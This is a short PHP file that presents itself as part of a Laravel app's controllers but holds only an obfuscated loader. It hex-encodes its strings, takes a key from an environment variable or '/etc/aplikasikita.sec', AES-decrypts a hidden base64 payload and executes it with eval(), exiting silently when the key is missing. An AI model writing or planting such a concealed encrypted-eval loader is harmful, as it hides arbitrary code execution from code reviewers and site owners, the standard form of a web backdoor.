<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ohDORMb0xWLpRa0ZBzU0+A==');

$c=base64_decode(

'HY5i3GGrgeeSEUI1vCEpfoqBirwnF/9cU2w2JR7F99awnCRLODH7ZkowEjxqiCAZBxLB3nojP7lg' .
'fwsNnbIabiVh1kWgI4Mqc/EKj1fZ1Q1JDpa1aNhBWL/AHdFi175iDNa9dFbLfPkWw8bSo7Tvuyr2' .
'idGKkqLzfRPhydnbH7ttDXM8A683TWjyQDWJWz5Jun5l6iXLS92267FyNUel0k1uuECm5NaUaObe' .
'vER6MspwthzzYyW/2/1qqnWMYGdESNI8SzORccE+4DCZ3jZ8rw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

